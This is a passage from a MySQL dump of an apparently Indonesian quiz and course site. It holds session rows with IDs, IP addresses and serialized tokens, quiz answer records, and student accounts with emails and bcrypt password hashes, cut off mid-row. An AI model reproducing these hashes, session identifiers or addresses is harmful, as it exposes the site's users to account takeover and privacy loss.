Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiZEJobnN6Vng4UWlsd21UT0lJZ0JPeXdQV2x0SXR0QjM5a2dFVlN5ViI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763425958),('llCtioCRJJ1vS2Kh6fvGjqtmwIp7AALBsrxUZW0E',87,'139.255.114.106','Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36 Edg/142.0.0.0','YTo1OntzOjY6Il90b2tlbiI7czo0MDoiNXdZWGs3eDBDTm5HSklwY01PaVJZdzdJUmhvMElPekxqWEZTZUd1SiI7czozOiJ1cmwiO2E6MDp7fXM6OToiX3ByZXZpb3VzIjthOjI6e3M6MzoidXJsIjtzOjMxOiJodHRwczovL2tlbGFzc2FyYWguaWQvZGFzaGJvYXJkIjtzOjU6InJvdXRlIjtzOjk6ImRhc2hib2FyZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fXM6NTA6ImxvZ2luX3dlYl81OWJhMzZhZGRjMmIyZjk0MDE1ODBmMDE0YzdmNThlYTRlMzA5ODlkIjtpOjg3O30=',1763430717),('ng6snCbiGRbyw4w1xeGeAaSXJcPBIiX738TPrk3z',NULL,'204.76.203.219','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoibGNKMTJ3SlhpRXRvUEI0cWJXTEJWN1p4MXhhUTFLUW5aV0g1MlhCbyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763428960),('Nn2BwdNpGBi2AuOnAWl71kX6pt90YYOMbBnVdKrW',NULL,'199.45.154.116','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiSHg3Q3MxVDVQamhaRzROeFQxcU5uY1NLc2hDT2JuY3dOV0prUjlZbCI7czo5OiJfcHJldmlvdXMiO2E6Mjp7czozOiJ1cmwiO3M6MjU6Imh0dHA6Ly8xMDMuMTAzLjIwLjM1OjgwODAiO3M6NToicm91dGUiO047fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763423452),('QGw6BGTPBMi6gntOCpT6uTs2p7dlKobw64Q0mmf7',NULL,'199.45.154.116','Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)','YTozOntzOjY6Il90b2tlbiI7czo0MDoid0xpZ1JMSWpReVQyZlZKQjRsNlh4TjZQTzloM3Z0bUZPR2IwYWFQUyI7czo5OiJfcHJldmlvdXMiO2E6Mjp7czozOiJ1cmwiO3M6MjU6Imh0dHA6Ly8xMDMuMTAzLjIwLjM1OjgwODAiO3M6NToicm91dGUiO047fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763423460),('RT8lrL7jmPoB8TkDv96wvxpUoYgrZiUJKbMCeyTN',NULL,'64.225.103.197','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiZzRmajVycGRMRm1HWHJtT1JKRjc4U1hMS3JRNGNjY0c4blVXWm1rUSI7czo5OiJfcHJldmlvdXMiO2E6Mjp7czozOiJ1cmwiO3M6MjU6Imh0dHA6Ly8xMDMuMTAzLjIwLjM1OjgwODAiO3M6NToicm91dGUiO047fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763418652),('TiZ1w6WE5fwVUKgspPX2b1Syj9R57c2TootL0qnW',NULL,'204.76.203.219','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiZzdIWjJxU2RRcjQ1VWoxYnVMQkJmeUZmS2kyZjF4MHdJVXo5NGxaWCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763426669),('ukZszk4OHiLbwWbug8OMmnAarrd3mioGna7QO645',NULL,'117.103.68.103','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTTE1RnFjOGtXbHFCSEs5R21TWVBhaG1NM1NtVWdsd2pucU9pWkR4NSI7czo5OiJfcHJldmlvdXMiO2E6Mjp7czozOiJ1cmwiO3M6MzA6Imh0dHBzOi8va2VsYXNzYXJhaC5pZC9jb3Vyc2UvOSI7czo1OiJyb3V0ZSI7czoxMToiY291cnNlLnNob3ciO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19',1763426089),('WRACvRDSc4iXWovHT0tHmHpgl1k1QYEEWNLj3I6B',NULL,'204.76.203.219','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiM3E2TkQ1TDd0WE5RZVQ5VFNrT3FtN1N5VkJwdEhMbExvUURnR2NheiI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763427445);
/*!40000 ALTER TABLE `sessions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_answers`
--

DROP TABLE IF EXISTS `user_answers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_answers` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint unsigned NOT NULL,
  `question_id` bigint unsigned NOT NULL,
  `option_id` bigint unsigned NOT NULL,
  `is_correct_at_time` char(1) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_answers_user_id_foreign` (`user_id`),
  KEY `user_answers_question_id_foreign` (`question_id`),
  KEY `user_answers_option_id_foreign` (`option_id`),
  CONSTRAINT `user_answers_option_id_foreign` FOREIGN KEY (`option_id`) REFERENCES `options` (`id`) ON DELETE CASCADE,
  CONSTRAINT `user_answers_question_id_foreign` FOREIGN KEY (`question_id`) REFERENCES `questions` (`id`) ON DELETE CASCADE,
  CONSTRAINT `user_answers_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_answers`
--

LOCK TABLES `user_answers` WRITE;
/*!40000 ALTER TABLE `user_answers` DISABLE KEYS */;
INSERT INTO `user_answers` VALUES (1,88,1,3,'0','2025-11-17 09:48:33','2025-11-17 09:48:33'),(2,88,2,7,'0','2025-11-17 09:48:33','2025-11-17 09:48:33'),(3,88,3,9,'0','2025-11-17 09:48:33','2025-11-17 09:48:33'),(4,88,4,14,'0','2025-11-17 09:48:33','2025-11-17 09:48:33'),(5,1,1,1,'1','2025-11-17 10:48:25','2025-11-17 10:48:25'),(6,1,2,7,'0','2025-11-17 10:48:25','2025-11-17 10:48:25'),(7,1,3,10,'0','2025-11-17 10:48:25','2025-11-17 10:48:25'),(8,1,4,16,'1','2025-11-17 10:48:25','2025-11-17 10:48:25');
/*!40000 ALTER TABLE `user_answers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `username` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `role` enum('guru','siswa') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'siswa',
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `has_completed_onboarding` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`),
  UNIQUE KEY `users_username_unique` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=94 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'siswa 1','siswa1','aisarah1@gmail.com',NULL,'$2y$12$k.BhGGF38r7TH35z.POhBuU/y0hxrCOZnjwOS18sTIhA2qSCwj376','siswa',NULL,'2025-11-17 06:34:33','2025-11-17 06:34:33',0),(2,'siswa 2','siswa2','aisarah2@gmail.com',NULL,'$2y$12$z5SXUS9tuOFW9Pc8iGoxROnyHEIZICGz2lLtjRvVwm7NNsZUfnfCW','siswa',NULL,'2025-11-17 06:34:33','2025-11-17 06:34:33',0),(3,'siswa 3','siswa3','aisarah3@gmail.com',NULL,'$2y$12$WI2bNclKKL6n.6lBE4wjse7VoeHWG.Vq6Sczt9HwqSo3KJMBqCwCa','siswa',NULL,'2025-11-17 06:34:33','2025-11-17 06:34:33',0),(4,'siswa 4','siswa4','aisarah4@gmail.com',NULL,'$2y$12$pzEyD1tyUM76TK0yNVTWvuK0A6Dxdvvcg.jJFR1F7cGkdrsEKjgf.','siswa',NULL,'2025-11-17 06:34:33','2025-11-17 06:34:33',0),(5,'siswa 5','siswa5','aisarah5@gmail.com',NULL,'$2y$12$5hGD8IBJAFhFrpL8W2O1KOoEY5IkL87Fnr54qY5nvLoGQLrc4XK92','siswa',NULL,'2025-11-17 06:34:34','2025-11-17 15:16:26',1),(6,'siswa 6','siswa6','aisarah6@gmail.com',NULL,'$2y$12$3aCGuJ301kmSCKkmcuQM7.MeV58HFScv2N34V/R8exdOHX9NUbEwW','siswa',NULL,'2025-11-17 06:34:34','2025-11-17 06:34:34',0),(7,'siswa 7','siswa7','aisarah7@gmail.com',NULL,'$2y$12$U4XgRy70J9JVBAskPEY/1OpIL2wUk.ItGAJX/rBA3orzr9NauowTS','siswa',NULL,'2025-11-17 06:34:35','2025-11-17 06:34:35',0),(8,'siswa 8','siswa8','aisarah8@gmail.com',NULL,'$2y$12$39Ev6XaemtohKDiV5yb3UO/fbOazWwSbs4EUvj1RECHXdWxJomSR2','siswa',NULL,'2025-11-17 06:34:35','2025-11-17 06:34:35',0),(9,'siswa 9','siswa9','aisarah9@gmail.com',NULL,'$2y$12$kMg0RAr.YfWoN/gjSerxE.dZorAiRI3pBkzHO5wCDlbe2jSpWVe8.','siswa',NULL,'2025-11-17 06:34:35','2025-11-17 06:34:35',0),(10,'siswa 10','siswa10','aisarah10@gmail.com',NULL,'$2y$12$SkFlsfvmAar6TE85P9U0LOqTh7IdPMunzReSQ8fEy9JevKVfOfBU2','siswa',NULL,'2025-11-17 06:34:35','2025-11-17 06:34:35',0),(11,'siswa 11','siswa11','aisarah11@gmail.com',NULL,'$2y$12$drTGXwuD8jyykWbNkBpDG.piLU.DVTVdjMZl0hf6UR5O.213iZEyu','siswa',NULL,'2025-11-17 06:34:36','2025-11-17 06:34:36',0),(12,'siswa 12','siswa12','aisarah12@gmail.com',NULL,'$2y$12$gO9xcvmxaLQ0egSfS2486.Z8sluzv5tGR4/uvVcT6rhDCnGU3EjHW','siswa',NULL,'2025-11-17 06:34:36','2025-11-17 06:34:36',0),(13,'siswa 13','siswa13','aisarah13@gmail.com',NULL,'$2y$12$Q26/J45PJJOkYkEMZcoelu4BtFsdqy4CUuxA8tKc2h4GLqiHA77UW','siswa',NULL,'2025-11-17 06:34:36','2025-11-17 06:34:36',0),(14,'siswa 14','siswa14','aisarah14@gmail.com',NULL,'$2y$12$AwkJ9d6MKzEYo9fwl6Xu0u8EIYcVkS9jJyxwZStvKWnaM9HHxydCK','siswa',NULL,'2025-11-17 06:34:37','2025-11-17 06:34:37',0),(15,'siswa 15','siswa15','aisarah15@gmail.com',NULL,'$2y$12$npFa0FwlMr.wYOWEDWyVEOSqd/0K.D5.FW5omhHB2.6UVs3SfgLPW','siswa',NULL,'2025-11-17 06:34:37','2025-11-17 06:34:37',0),(16,'siswa 16','siswa16','aisarah16@gmail.com',NULL,'$2y$12$aGeh79qPF5mFb8wyHUXWUuhaoOB1ogccGH98YLklXryOLav5u6ngq','siswa',NULL,'2025-11-17 06:34:37','2025-11-17 06:34:37',0),(17,'siswa 17','siswa17','aisarah17@gmail.com',NULL,'$2y$12$I36LRA5aFcGutTm/IyL5R.2GvYZKxsgo6B3mrpRP9AhrDgf4bbNxa','siswa',NULL,'2025-11-17 06:34:37','2025-11-17 06:34:37',0),(18,'siswa 18','siswa18','aisarah18@gmail.com',NULL,'$2y$12$cz4pG7.uHtWCbkvOgzqKmupnMxxLcggVhRcZLXurNDs4amhyzt0o.','siswa',NULL,'2025-11-17 06:34:38','2025-11-17 06:34:38',0),(19,'siswa 19','siswa19','aisarah19@gmail.com',NULL,'$2y$12$5bzZ2MBSHs40EcTZ.gLPMOVpAPc0tSoJOfALOTBbpNAo.30FO5ug2','siswa',NULL,'2025-11-17 06:34:38','2025-11-17 06:34:38',0),(20,'siswa 20','siswa20','aisarah20@gmail.com',NULL,'$2y$12$qFMTy/SbNCYB.LVGP0LYV.7XwxezFOxwnpxb3n9a/GCSZuhsu7dSa','siswa',NULL,'2025-11-17 06:34:38','2025-11-17 06:34:38',0),(21,'siswa 21','siswa21','aisarah21@gmail.com',NULL,'$2y$12$9nScksIi9VlQ6dl8tGo1h.5r/tRFzQvzXS5qrjTMyQcvqXkOvdD/O','siswa',NULL,'2025-11-17 06:34:39','2025-11-17 06:34:39',0),(22,'siswa 22','siswa22','aisarah22@gmail.com',NULL,'$2y$12$OzvFOuDhkXMJweDkJKoYYeG8Na1KCte2ClzCoJzGNpOsd1RDQ7U4S','siswa',NULL,'2025-11-17 06:34:39','2025-11-17 06:34:39',0),(23,'siswa 23','siswa23','aisarah23@gmail.com',NULL,'$2y$12$VowNeUCd0mR.jrGCOG72i.X7b.JSaBFDUTc8xEz23H3irFCcF4r8y','siswa',NULL,'2025-11-17 06:34:39','2025-11-17 06:34:39',0),(24,'siswa 24','siswa24','aisarah24@gmail.com',NULL,'$2y$12$xF6/sRTjVHLln/TG/p4QKukcRuqSCStGaPD6QW6i433twFXgVCGaK','siswa',NULL,'2025-11-17 06:34:40','2025-11-17 06:34:40',0),(25,'siswa 25','siswa25','aisarah25@gmail.com',NULL,'$2y$12$q16ipc3g2EMVi4ZV1aQ1T.tF/lCgeMVnqQd9/UJDXBhytF8e4kyd2','siswa',NULL,'2025-11-17 06:34:40','2025-11-17 06:34:40',0),(26,'siswa 26','siswa26','aisarah26@gmail.com',NULL,'$2y$12$CnWkzPUPZqOqSEgQu0jAz.prM4mTKukqrbrMOhVem7Ok1PWUk/U6m','siswa',NULL,'2025-11-17 06:34:40','2025-11-17 06:34:40',0),(27,'siswa 27','siswa27','aisarah27@gmail.com',NULL,'$2y$12$r3f8cduIInJg6NF5OqVEE.tU28hjDo0nS52YfeJjIN5i1/Pl2cagi','siswa',NULL,'2025-11-17 06:34:40','2025-11-17 06:34:40',0),(28,'siswa 28','siswa28','aisarah28@gmail.com',NULL,'$2y$12$Tc3DxUhYKh9LyI0B7azl8.RZ4AxWrb8dySRRqMILPhnDx.tFNbL0S','siswa',NULL,'2025-11-17 06:34:41','2025-11-17 06:34:41',0),(29,'siswa 29','siswa29','aisarah29@gmail.com',NULL,'$2y$12$vIKH6/p0QP.DagZzypP68OWdDoVcBMdS0ahl8FUWULnwuI4KdP1hu','siswa',NULL,'2025-11-17 06:34:41','2025-11-17 06:34:41',0),(30,'siswa 30','siswa30','aisarah30@gmail.com',NULL,'$2y$12$O9e6Db5uJHBLM5Lbp9nCW.6Nqah4yCtDxPkHDs1DfD/Oq5p9GRk16','siswa',NULL,'2025-11-17 06:34:41','2025-11-17 06:34:41',0),(31,'siswa 31','siswa31','aisarah31@gmail.com',NULL,'$2y$12$ydeGJpI5kJvoBHqOSKR2t.cxPjvtuA0VenBM2uzTQIdW5LiqVdqX6','siswa',NULL,'2025-11-17 06:34:42','2025-11-17 06:34:42',0),(32,'siswa 32','siswa32','aisarah32@gmail.com',NULL,'$2y$12$Z7mgXtxF8k7vRD5HA5mQOu9QtjkL.BguTxy.cpmU1G3Z02pptGGMq','siswa',NULL,'2025-11-17 06:34:42','2025-11-17 06:34:42',0),(33,'siswa 33','siswa33','aisarah33@gmail.com',NULL,'$2y$12$rNZZyEuuQiEmwlidLmTpKeaWmulVa6jnUJgrDJ2DgV3d75pm74vZK','siswa',NULL,'2025-11-17 06:34:42','2025-11-17 06:34:42',0),(34,'siswa 34','siswa34','aisarah34@gmail.com',NULL,'$2y$12$yOQLYgWL8MKd9h2m7Jj.iugG062TLfWiJUNFnTrgTH2Ser04oXD0m','siswa',NULL,'2025-11-17 06:34:43','2025-11-17 06:34:43',0),(35,'siswa 35','siswa35','aisarah35@gmail.com',NULL,'$2y$12$D3gOa..NuMa5RuPi1G9qPOKEQ0FEsKuO0AWr1K6I9iMyEknfQ6UXq','siswa',NULL,'2025-11-17 06:34:43','2025-11-17 06:34:43',0),(36,'siswa 36','siswa36','aisarah36@gmail.com',NULL,'$2y$12$79Dvm/0K9tvkB76Hh8ss3u1VyyrcldLblhJa6QHFt7mH7zaebTFEK','siswa',NULL,'2025-11-17 06:34:43','2025-11-17 06:34:43',0),(37,'siswa 37','siswa37','aisarah37@gmail.com',NULL,'$2y$12$ppM58NkcIEGRXkAVI7.ih.kuMY.W6gA90mvyaQPmV5R/8lRHSLXaa','siswa',NULL,'2025-11-17 06:34:43','2025-11-17 06:34:43',0),(38,'siswa 38','siswa38','aisarah38@gmail.com',NULL,'$2y$12$NyY3cTjhkjlqgehMrP9Yxe03IXyUHm5BEjGT8oAUi6TZpMiZwSGgS','siswa',NULL,'2025-11-17 06:34:44','2025-11-17 06:34:44',0),(39,'siswa 39','siswa39','aisarah39@gmail.com',NULL,'$2y$12$NXwnZ5lQDl0ypt0Af0BQPeUP4UzDzY5CFvltvocYWsl1l6krMEz5e','siswa',NULL,'2025-11-17 06:34:44','2025-11-17 06:34:44',0),(40,'siswa 40','siswa40','aisarah40@gmail.com',NULL,'$2y$12$yXmhRC0kkGN0QSk9sC74Vuq760qb3CtVgrUnGVMYRs35AxIw2DGie','siswa',NULL,'2025-11-17 06:34:44','2025-11-17 06:34:44',0),(41,'siswa 41','siswa41','aisarah41@gmail.com',NULL,'$2y$12$aTXa6F137eNqk8uNJ8FvX.JaZeNECrnfvoqsUX6HsjKxKLKxfC8oG','siswa',NULL,'2025-11-17 06:34:45','2025-11-17 06:34:45',0),(42,'siswa 42','siswa42','aisarah42@gmail.com',NULL,'$2y$12$bbr.h.luVUO6ruVBBJwwiuq0/KDJ8OxYTAYv1Ro8.zxXvWvM9s/TO','siswa',NULL,'2025-11-17 06:34:45','2025-11-17 06:34:45',0),(43,'siswa 43','siswa43','aisarah43@gmail.com',NULL,'$2y$12$QB21s.zPzWaBImA6F/ZzP.vTlIKrMyUAmB4qrQ7/3Au8SMDH2aadi','siswa',NULL,'2025-11-17 06:34:45','2025-11-17 06:34:45',0),(44,'siswa 44','siswa44','aisarah44@gmail.com',NULL,'$2y$12$Bk/Ova9P7aXRCaKIgcZcdOaMJqrbuS.FydrHg9w4dXkQeGrvBhzLm','siswa',NULL,'2025-11-17 06:34:46','2025-11-17 06:34:46',0),(45,'siswa 45','siswa45','aisarah45@gmail.com',NULL,'$2y$12$fOnS3chCbG1ckJsg4VncIe6na1U.1fpprpFAarRWSgGT8EBkhmEly','siswa',NULL,'2025-11-17 06:34:46','2025-11-17 06:34:46',0),(46,'siswa 46','siswa46','aisarah46@gmail.com',NULL,'$2y$12$MyVtG1QruDX7AXBPifbtQuByo20C3wbAFBAS7XzAE470FYjbwK3tm','siswa',NULL,'2025-11-17 06:34:46','2025-11-17 06:34:46',0),(47,'siswa 47','siswa47','aisarah47@gmail.com',NULL,'$2y$12$SIAZCyo8dedXr86PEvPQd.NfITIr0bvzgURGEDrPqO6OQfhNEpVyu','siswa',NULL,'2025-11-17 06:34:46','2025-11-17 06:34:46',0),(48,'siswa 48','siswa48','aisarah48@gmail.com',NULL,'$2y$12$ZD9ZRPjunLVLSoBEsEkMkeMRBVRk7mn0V9SiYDjrjIpTU0lF87oMe','siswa',NULL,'2025-11-17 06:34:47','2025-11-17 06:34:47',0),(49,'siswa 49','siswa49','aisarah49@gmail.com',NULL,'$2y$12$HywUlCiAoDbrv.v3I8OChubD5zJYcJAjK8UMsHVF9..lQ0/tSv51S','siswa',NULL,'2025-11-17 06:34:47','2025-11-17 06:34:47',0),(50,'siswa 50','siswa50','aisarah50@gmail.com',NULL,'$2y$12$ULAXZzXYdyRNPSo4nXXnp.DBEXA.V3jY9Tp9s.aJ1V/R9CkpKKny.','siswa',NULL,'2025-11-17 06:34:47','2025-11-17 06:34:47',0),(51,'siswa 51','siswa51','aisarah51@gmail.com',NULL,'$2y$12$EKB3z3auZmuDYzuQZU1SoudnFNmCMEJjbW9cJFBytWyAcThwvmDoy','siswa',NULL,'2025-11-17 06:34:48','2025-11-17 06:34:48',0),(52,'siswa 52','siswa52','aisarah52@gmail.com',NULL,'$2y$12$lrH1.0zzNeqG/kLfR8Lpv.FGHpZrT.PFMLzh/k7YOyhVayTRNjIIq','siswa',NULL,'2025-11-17 06:34:48','2025-11-17 06:34:48',0),(53,'siswa 53','siswa53','aisarah53@gmail.com',NULL,'$2y$12$o/BYSV8OXLEcLhJSfXJpme3s5/9/Hc8iWEO/hCwv3zWQzXgPB5SjG','siswa',NULL,'2025-11-17 06:34:48','2025-11-17 06:34:48',0),(54,'siswa 54','siswa54','aisarah54@gmail.com',NULL,'$2y$12$NDmkiSOwbv8YrL2/c2uPHu6s7Hd13u4gZznL4fKM252XdyX4m2CMi','siswa',NULL,'2025-11-17 06:34:48','2025-11-17 06:34:48',0),(55,'siswa 55','siswa55','aisarah55@gmail.com',NULL,'$2y$12$0z2JQDjsgbAD2QF1kM/x4.du.3cAUFLNcADm8nK/xjgrMKi172uoy','siswa',NULL,'2025-11-17 06:34:49','2025-11-17 06:34:49',0),(56,'siswa 56','siswa56','aisarah56@gmail.com',NULL,'$2y$12$/mVyPzkoC/Ztd3hlB3sZneQmo9ffGzmpHTgN3FphDQrlF.vgeNb16','siswa',NULL,'2025-11-17 06:34:49','2025-11-17 06:34:49',0),(57,'siswa 57','siswa57','aisarah57@gmail.com',NULL,'$2y$12$U6GPHCMyMWcNFnjBjAYNQO2uRroBL8y8.zpiuqG.MIuVNpTJvAxt.','siswa',NULL,'2025-11-17 06:34:49','2025-11-17 06:34:49',0),(58,'siswa 58','siswa58','aisarah58@gmail.com',NULL,'$2y$12$bT2U5lTJ8LG8sV6Vfxod3OpiNoLCKUnucteZ33HQX74Hl36i8s/4u','siswa',NULL,'2025-11-17 06:34:50','2025-11-17 06:34:50',0),(59,'siswa 59','siswa59','aisarah59@gmail.com',NULL,'$2y$12$9N09XeRlwPF8P19oRM8jEeBS3KjTyTApKU8X6kC7GAR1LCFuN8jmy','siswa',NULL,'2025-11-17 06:34:50','2025-11-17 06:34:50',0),(60,'siswa 60','siswa60','aisarah60@gmail.com',NULL,'$2y$12$7hiy0K7Lidq6fIcjNVHu5.5zNwa./70fd1./hEsKuBfnhp.JsaxaG','siswa',NULL,'2025-11-17 06:34:50','2025-11-17 06:34:50',0),(61,'siswa 61','siswa61','aisarah61@gmail.com',NULL,'$2y$12$hR7ulrDPdsQdX/ZzW8sDqeecMUX1SMc0IiaaOnatEd5N25bHeTNla','siswa',NULL,'2025-11-17 06:34:51','2025-11-17 06:34:51',0),(62,'siswa 62','siswa62','aisarah62@gmail.com',NULL,'$2y$12$rehfiR7BytAX4Ci9eK/msOWtYOdQX2neRQnCtFTjYxCRx/UbuPV.S','siswa',NULL,'2025-11-17 06:34:51','2025-11-17 06:34:51',0),(63,'siswa 63','siswa63','aisarah63@gmail.com',NULL,'$2y$12$BSVopAiyoXxYLU/lwBCZIuNk9X8xUarktUfPFVmyhqLUn28lKIfRC','siswa',NULL,'2025-11-17 06:34:51','2025-11-17 06:34:51',0),(64,'siswa 64','siswa64','aisarah64@gmail.com',NULL,'$2y$12$ZHpqKehJH/3cHV4Zq9w3euvxj.yAm2zf313lsZLQnpdsf6/Mj1Thi','siswa',NULL,'2025-11-17 06:34:51','2025-11-17 06:34:51',0),(65,'siswa 65','siswa65','aisarah65@gmail.com',NULL,'$2y$12$oQX0frxDOqDfCDC7M1MYcOcnwEEYh48W16IvkmtcXy82V.ZoMLtCm','siswa',NULL,'2025-11-17 06:34:52','2025-11-17 06:34:52',0),(66,'siswa 66','siswa66','aisarah66@gmail.com',NULL,'$2y$12$aGBpgGdF6AwaxPO57u9kjOj9lhM/KheW61OtpViQlnn7H0o/wMNOO','siswa',NULL,'2025-11-17 06:34:52','2025-11-17 06:34:52',0),(67,'siswa 67','siswa67','aisarah67@gmail.com',NULL,'$2y$12$R1LqSSlAjkj5kV/8oDaw/eJ7x8bN9pZmCRcKUQEGieNCWSkCoBij6','siswa',NULL,'2025-11-17 06:34:52','2025-11-17 06:34:52',0),(68,'siswa 68','siswa68','aisarah68@gmail.com',NULL,'$2y$12$fhvV7XZX49/Yu.9BP9/cvuHueiQHxR5Bwx2dBRrUKi4J6jYxK.Fmm','siswa',NULL,'2025-11-17 06:34:53','2025-11-17 06:34:53',0),(69,'siswa 69','siswa69','aisarah69@gmail.com',NULL,'$2y$12$GbL.KLlAQ9OUzuUdw34j/udWbKHHvW4ELsT3o3PGaeLtddunCx8YS','siswa',NULL,'2025-11-17 06:34:53','2025-11-17 06:34:53',0),(70,'siswa 70','siswa70','aisarah70@gmail.com',NULL,'$2y$12$Y1kAlPwA8qrwowZ79LO7wumGXNgNbB1fTDt3ChTpJ3LJfZRc/zO1G','siswa',NULL,'2025-11-17 06:34:53','2025-11-17 06:34:53',0),(71,'siswa 71','siswa71','aisarah71@gmail.com',NULL,'$2y$12$vMG7LBpbDxS8U31GGXZ3YeRpagmrEeSY8PEWWGjJtAakQjjJSs3g6','siswa',NULL,'2025-11-17 06:34:54','2025-11-17 06:34:54',0),(72,'siswa 72','siswa72','aisarah72@gmail.com',NULL,'$2y$12$rvM0dlrKE7z0G5Rzr/f4pOU0XO7HdgMk5izfU22aKwfIjMq9iY0FG','siswa',NULL,'2025-11-17 06:34:54','2025-11-17 06:34:54',0),(73,'siswa 73','siswa73','aisarah73@gmail.com',NULL,'$2y$12$uCFfdtaAXcvnHr5QAg0eTOJAP4e2VQho3N21vG7bsqtiUJA4QTnBy','siswa',NULL,'2025-11-17 06:34:54','2025-11-17 06:34:54',0),(74,'siswa 74','siswa74','aisarah74@gmail.com',NULL,'$2y$12$jyZ/q6kZEGXB5EspzDq0tum.oxDBQr7Upcdn27JjnEOmtWNufWptG','siswa',NULL,'2025-11-17 06:34:54','2025-11-17 06:34:54',0),(75,'siswa 75','siswa75','aisarah75@gmail.com',NULL,'$2y$12$qFJR5e7qk.V8GISuAM8TM.o41BGcEoHkJybvqqrc.M9qK4HzpBBFe','siswa',NULL,'2025-11-17 06:34:55','2025-11-17 06:34:55',0),(76,'siswa 76','siswa76','aisarah76@gmail.com',NULL,'$2y$12$K.3YP0IR6n/F8fyIvKTeseejOlLfSUoRIT8quLiTfTPTE8CgCIwMi','siswa',NULL,'2025-11-17 06:34:55','2025-11-17 06:34:55',0),(77,'siswa 77','siswa77','aisarah77@gmail.com',NULL,'$2y$12$LfWa4U4M5jcj1dRUjyKrserpI9/BX/xnDdEQJ38Mpfigg1BJtOuC6','siswa',NULL,'2025-11-17 06:34:55','2025-11-17 06:34:55',0),(78,'siswa 78','siswa78','aisarah78@gmail.com',NULL,'$2y$12$4WNuhPtwWH9f/FS0cF4EjecmJqvEQIx2ckErupuSqo1P.pPLYm3lm','siswa',NULL,'2025-11-17 06:34:56','2025-11-17 06:34:56',0),(79,'siswa 79','siswa79','aisarah79@gmail.com',NULL,'$2y$12$piiW7zi3RUGtl1bR3OgnF.b2wMpen3Iv98/bJ3HYYkSl2LeptO1Oe','siswa',NULL,'2025-11-17 06:34:56','2025-11-17 06:34:56',0),(80,'siswa 80','siswa80','aisarah80@gmail.com',NULL,'$2y$12$mzeNLKSjWrSDRoTHg/eDFOTgKiOpxdicUjwM8ts7PF6T4ASULSQne','siswa',NULL,'2025-11-17 